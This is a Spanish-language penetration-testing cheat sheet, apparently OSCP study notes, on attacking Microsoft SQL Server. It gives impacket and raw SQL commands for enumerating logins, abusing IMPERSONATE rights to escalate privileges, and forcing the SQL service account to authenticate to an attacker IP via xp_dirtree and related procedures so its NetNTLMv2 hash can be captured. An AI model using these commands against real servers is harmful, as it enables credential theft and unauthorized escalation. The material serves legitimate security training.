
---

tags:

- pentesting
- mssql
- active-directory
- oscp puerto: 1433

---

# MSSQL

> [!info] Datos rápidos
> 
> - **Puerto:** `1433`
> - **Cliente recomendado:** `impacket-mssqlclient`

## MySQL vs MSSQL — modelo mental

|Nivel|MySQL|MSSQL|
|---|---|---|
|**Contenedor principal**|Database (o Schema)|Database|
|**Organización interna**|No tiene (tablas directas a la DB)|**Esquema** (capa intermedia)|
|**Referencia completa**|`base_de_datos.tabla`|`BaseDeDatos.Esquema.Tabla`|
|**Seguridad**|Base de datos / tabla|Base de datos / esquema / tabla|

> [!tip] Login vs Usuario
> 
> - **Login** = identidad a nivel de **servidor** (toda la instancia). Es con lo que te conectas. Vive en `master` → `sys.server_principals`.
> - **Usuario (user)** = identidad a nivel de **base de datos** concreta. Vive en cada BD → `sys.database_principals`.
> - Un login se **mapea** a un usuario dentro de cada base, y puede tener permisos distintos en cada una.

---

## Conexión

```shell
impacket-mssqlclient '[DOMAIN]/[USER]:[PASS]@[IP]'
```

> [!note] Si el DC fuerza cifrado Añade `-windows-auth` para auth de Windows, o valora LDAPS/opciones de canal según lo que pida el servidor.

---

# 🅰️ Con `mssqlclient.py` (Impacket)

> Comandos internos del cliente. Todos los `enum_*` no requieren escribir SQL.

## Ubicarte

```ruby
enum_db          # lista bases de datos
enum_logins      # logins del servidor + sus roles
enum_users       # usuarios de la BD actual
enum_impersonate # a quién puedes suplantar
```

## Impersonation

```ruby
# Suplantar un LOGIN (nivel servidor)
exec_as_login <usuario_objetivo>

# Suplantar un USER (nivel base de datos)
exec_as_user <usuario_objetivo>
```

## Navegación

```ruby
use <DATABASE>          # cambiar de base de datos
enum_tables             # (según versión) tablas de la BD actual
```

## Obtener hash NTLMv2 (auth saliente)

```ruby
xp_dirtree \\TU_IP\share
```

> [!tip] `xp_dirtree` suele ser ejecutable a bajo privilegio. Fuerza que la **cuenta de servicio de SQL** se autentique contra tu host → capturas su NetNTLMv2 (Responder / smbserver).

---

# 🅱️ Manualmente (queries SQL)

> Funciona en cualquier cliente **y** en SQLi. Es lo que hay que dominar.

## Ubicarte

```sql
SELECT @@version;                       -- versión y OS
SELECT SYSTEM_USER;                     -- tu login
SELECT USER_NAME();                     -- tu usuario en la BD
SELECT DB_NAME();                       -- BD actual
SELECT IS_SRVROLEMEMBER('sysadmin');    -- ¿eres sysadmin? (1 = sí)
```

## Mirar logins (Server Principals)

```sql
SELECT name, type_desc, is_disabled
FROM sys.server_principals
WHERE type_desc IN ('SQL_LOGIN', 'WINDOWS_LOGIN');
```

## Mirar usuarios de BD (Database Principals)

```sql
SELECT name
FROM sys.database_principals
WHERE type_desc IN ('SQL_USER', 'WINDOWS_USER');
```

## Impersonation

```sql
-- ¿A qué LOGINS puedo suplantar? (nivel servidor)
SELECT DISTINCT b.name AS puedes_impersonar
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
    ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- ¿A qué USERS puedo suplantar? (nivel BD — repetir por cada base)
SELECT DISTINCT b.name AS puedes_impersonar_en_esta_bd
FROM sys.database_permissions a
INNER JOIN sys.database_principals b
    ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
```

```sql
-- Suplantar y comprobar
EXECUTE AS LOGIN = 'appdev';
SELECT SYSTEM_USER;                     -- confirma identidad
SELECT IS_SRVROLEMEMBER('sysadmin');    -- ¿ganaste privilegios?
REVERT;                                 -- volver a tu identidad
```

> [!warning] Recorre todas las bases La impersonation de **usuarios** es por base de datos. Cambia con `USE <base>` y repite la query en cada una — mucha gente se queda solo en `master` y se pierde permisos.

## Obtener hash NTLMv2 (auth saliente)

```sql
EXEC xp_dirtree '\\TU_IP\share', 1, 1;
EXEC xp_fileexist '\\TU_IP\share';
EXEC xp_subdirs '\\TU_IP\share';
EXEC master..xp_dirtree '\\TU_IP\x';
```

## Navegación

```sql
-- Bases de datos (ignorar: master, model, msdb, tempdb)
SELECT name FROM sys.databases;

-- Cambiar de base
USE <DATABASE>;

-- Tablas de la BD actual
SELECT name FROM sys.tables;

-- Tablas de OTRA base sin entrar (clave en SQLi)
SELECT table_name FROM <base>.information_schema.tables;

-- Columnas de una tabla
SELECT column_name, data_type
FROM information_schema.columns
WHERE table_name = '<tabla>';
```

---

## Checklist mental (orden de prioridad)

1. ¿Soy `sysadmin`? → todo abierto.
2. ¿A quién puedo **impersonar**? → escalar dentro del motor.
3. ¿Hay **linked servers**? → saltar a otra instancia con más privilegio.
4. ¿Puedo forzar **auth saliente** (`xp_dirtree`)? → capturar hash del servicio.
5. ¿Puedo **ejecutar comandos** (`xp_cmdshell` / OLE / CLR)?
6. **Enumerar datos** de todas las bases.
7. Revisar **TRUSTWORTHY** + ownership → escaladas indirectas.

> [!cite] Referencias
> 
> - HackTricks → MSSQL
> - PayloadsAllTheThings → MSSQL Injection
> - PowerUpSQL (Windows) / `mssqlclient.py` (Impacket)